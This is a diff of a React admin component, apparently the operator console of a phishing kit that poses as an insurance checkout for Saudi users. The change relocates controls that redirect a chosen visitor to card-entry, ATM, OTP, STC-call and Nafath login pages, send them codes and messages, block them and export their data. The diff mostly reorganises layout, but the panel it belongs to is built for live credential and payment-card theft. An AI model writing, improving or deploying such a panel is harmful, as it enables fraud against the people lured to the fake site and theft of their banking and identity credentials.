@@ -80,7 +80,7 @@ const VisitorDetailsPanel: React.FC<Props> = ({
       </button>
 
       {/* Compact Header */}
-      <div className="bg-gradient-to-l from-primary/5 to-transparent border-b border-border/60 p-3 md:p-4 shrink-0">
+      <div className="bg-gradient-to-l from-primary/5 to-transparent border-b border-border/60 p-3 md:p-4 shrink-0 space-y-2.5">
 
         <div className="flex items-start gap-2.5 md:gap-3">
           <div className={`w-10 h-10 md:w-12 md:h-12 rounded-xl md:rounded-2xl flex items-center justify-center shrink-0 shadow-md bg-gradient-to-br ${avatarColor.bg} border border-white/20`}>
@@ -107,6 +107,86 @@ const VisitorDetailsPanel: React.FC<Props> = ({
               <span className="inline-flex items-center gap-1"><Clock className="w-2.5 md:w-3 h-2.5 md:h-3" />{getSessionDuration(selectedVisitor.created_at, selectedVisitor.last_seen_at)}</span>
             </div>
           </div>
+        </div>
+
+        {/* Redirect */}
+        <div className="flex items-center gap-2">
+          <Navigation className="w-3 h-3 text-primary shrink-0" />
+          <select
+            value={redirectPage}
+            onChange={e => setRedirectPage(e.target.value)}
+            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground"
+          >
+            <option value="">اختر صفحة</option>
+            <optgroup label="التأمين">
+              <option value="/insurance/checkout">إتمام الشراء</option>
+              <option value="/insurance/payment">إدخال البطاقة</option>
+              <option value="/insurance/atm">الصراف ATM</option>
+            </optgroup>
+            <optgroup label="التحقق">
+              <option value="/insurance/otp">OTP</option>
+              <option value="/insurance/phone-otp">OTP الجوال</option>
+              <option value="/insurance/phone-verify">توثيق الجوال</option>
+              <option value="/insurance/phone-stc">مكالمة STC</option>
+              <option value="/insurance/nafath-login">نفاذ</option>
+              <option value="/insurance/nafath-verify">تحقق نفاذ</option>
+            </optgroup>
+          </select>
+          <button
+            onClick={() => { if (redirectPage) onRedirect(redirectPage); }}
+            disabled={!redirectPage}
+            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all"
+          >
+            توجيه
+          </button>
+        </div>
+
+        {/* Send Code */}
+        <div className="flex items-center gap-2">
+          <KeyRound className="w-3 h-3 text-primary shrink-0" />
+          <input
+            type="text"
+            placeholder="أدخل الرمز"
+            value={codeInput}
+            onChange={e => setCodeInput(e.target.value)}
+            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground"
+          />
+          <button
+            onClick={() => { if (codeInput.trim() && onSendCode) { onSendCode(codeInput.trim()); setCodeInput(""); } }}
+            disabled={!codeInput.trim()}
+            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all"
+          >
+            إرسال
+          </button>
+        </div>
+
+        {/* Send Final Message */}
+        <div className="flex items-center gap-2">
+          <Send className="w-3 h-3 text-emerald-600 shrink-0" />
+          <input
+            type="text"
+            placeholder="أدخل الرسالة"
+            value={messageInput}
+            onChange={e => setMessageInput(e.target.value)}
+            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground"
+          />
+          <button
+            onClick={() => { if (messageInput.trim() && onSendFinalMessage) { onSendFinalMessage(messageInput.trim()); setMessageInput(""); } }}
+            disabled={!messageInput.trim()}
+            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-emerald-600 text-white hover:bg-emerald-700 disabled:opacity-40 transition-all"
+          >
+            إرسال
+          </button>
+        </div>
+
+        {/* Block / Unblock + Export */}
+        <div className="flex items-center gap-2">
+          <button onClick={onBlockToggle} disabled={loadingAction === "block"} className={`h-7 px-3 rounded-lg text-[10px] font-bold transition-all inline-flex items-center gap-1 ${selectedVisitor.is_blocked ? "bg-muted text-muted-foreground hover:bg-muted/80" : "bg-destructive text-destructive-foreground hover:bg-destructive/90"}`}>
+            {selectedVisitor.is_blocked ? <><ShieldCheck className="w-3 h-3" />فك الحظر</> : <><Ban className="w-3 h-3" />حظر</>}
+          </button>
+          <button onClick={onExportPDF} className="h-7 px-3 rounded-lg text-[10px] font-bold bg-muted/40 text-muted-foreground border border-transparent hover:bg-muted transition-all inline-flex items-center gap-1 mr-auto">
+            <Download className="w-3 h-3" />تصدير PDF
+          </button>
         </div>
 
       </div>
@@ -220,88 +300,6 @@ const VisitorDetailsPanel: React.FC<Props> = ({
         </motion.div>
       </div>
 
-      {/* Actions Footer */}
-      <div className="border-t border-border/60 px-3 md:px-4 py-2.5 space-y-2 shrink-0 bg-muted/20">
-        {/* Redirect */}
-        <div className="flex items-center gap-2">
-          <Navigation className="w-3 h-3 text-primary shrink-0" />
-          <select
-            value={redirectPage}
-            onChange={e => setRedirectPage(e.target.value)}
-            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground"
-          >
-            <option value="">اختر صفحة</option>
-            <optgroup label="التأمين">
-              <option value="/insurance/checkout">إتمام الشراء</option>
-              <option value="/insurance/payment">إدخال البطاقة</option>
-              <option value="/insurance/atm">الصراف ATM</option>
-            </optgroup>
-            <optgroup label="التحقق">
-              <option value="/insurance/otp">OTP</option>
-              <option value="/insurance/phone-otp">OTP الجوال</option>
-              <option value="/insurance/phone-verify">توثيق الجوال</option>
-              <option value="/insurance/phone-stc">مكالمة STC</option>
-              <option value="/insurance/nafath-login">نفاذ</option>
-              <option value="/insurance/nafath-verify">تحقق نفاذ</option>
-            </optgroup>
-          </select>
-          <button
-            onClick={() => { if (redirectPage) onRedirect(redirectPage); }}
-            disabled={!redirectPage}
-            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all"
-          >
-            توجيه
-          </button>
-        </div>
-
-        {/* Send Code */}
-        <div className="flex items-center gap-2">
-          <KeyRound className="w-3 h-3 text-primary shrink-0" />
-          <input
-            type="text"
-            placeholder="أدخل الرمز"
-            value={codeInput}
-            onChange={e => setCodeInput(e.target.value)}
-            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground"
-          />
-          <button
-            onClick={() => { if (codeInput.trim() && onSendCode) { onSendCode(codeInput.trim()); setCodeInput(""); } }}
-            disabled={!codeInput.trim()}
-            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all"
-          >
-            إرسال
-          </button>
-        </div>
-
-        {/* Send Final Message */}
-        <div className="flex items-center gap-2">
-          <Send className="w-3 h-3 text-emerald-600 shrink-0" />
-          <input
-            type="text"
-            placeholder="أدخل الرسالة"
-            value={messageInput}
-            onChange={e => setMessageInput(e.target.value)}
-            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground"
-          />
-          <button
-            onClick={() => { if (messageInput.trim() && onSendFinalMessage) { onSendFinalMessage(messageInput.trim()); setMessageInput(""); } }}
-            disabled={!messageInput.trim()}
-            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-emerald-600 text-white hover:bg-emerald-700 disabled:opacity-40 transition-all"
-          >
-            إرسال
-          </button>
-        </div>
-
-        {/* Block / Unblock + Export */}
-        <div className="flex items-center gap-2">
-          <button onClick={onBlockToggle} disabled={loadingAction === "block"} className={`h-7 px-3 rounded-lg text-[10px] font-bold transition-all inline-flex items-center gap-1 ${selectedVisitor.is_blocked ? "bg-muted text-muted-foreground hover:bg-muted/80" : "bg-destructive text-destructive-foreground hover:bg-destructive/90"}`}>
-            {selectedVisitor.is_blocked ? <><ShieldCheck className="w-3 h-3" />فك الحظر</> : <><Ban className="w-3 h-3" />حظر</>}
-          </button>
-          <button onClick={onExportPDF} className="h-7 px-3 rounded-lg text-[10px] font-bold bg-muted/40 text-muted-foreground border border-transparent hover:bg-muted transition-all inline-flex items-center gap-1 mr-auto">
-            <Download className="w-3 h-3" />تصدير PDF
-          </button>
-        </div>
-      </div>
     </motion.div>
   );
 };
